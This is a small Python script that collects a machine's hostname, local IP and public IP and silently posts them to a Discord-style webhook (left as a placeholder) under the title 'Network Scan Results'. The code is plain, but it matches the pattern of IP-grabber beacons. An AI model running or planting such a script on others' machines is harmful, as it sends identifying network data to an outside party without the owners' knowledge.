import socket
import urllib.request
import requests
SHOW_LOGS = False
WEBHOOK_URL = "WEBHOOK_URL"
def log(*args, **kwargs):
    if SHOW_LOGS:
        print(*args, **kwargs)
def scan_network():
    hostname = socket.gethostname()
    try:
        local_ip = socket.gethostbyname(hostname)
    except Exception:
        local_ip = "ERROR"
    try:
        with urllib.request.urlopen(
            "https://api.ipify.org", timeout=5
        ) as response:
            public_ip = response.read().decode().strip()
    except Exception:
        public_ip = "TIMEOUT / OFFLINE"
    return hostname, local_ip, public_ip
def send_webhook(hostname, local_ip, public_ip):
    payload = {
        "embeds": [
            {
                "title": "Network Scan Results",
                "color": 0x9B59B6,
                "description": (
                    f"Hostname: `{hostname}`\n"
                    f"Local IP: `{local_ip}`\n"
                    f"Public IP: `{public_ip}`"
                )
            }
        ]
    }
    try:
        response = requests.post(
            WEBHOOK_URL,
            json=payload,
            timeout=5
        )
        response.raise_for_status()
        log("Webhook sent.")
    except requests.RequestException:
        log("Webhook failed.")
if __name__ == "__main__":
    hostname, local_ip, public_ip = scan_network()
    send_webhook(hostname, local_ip, public_ip)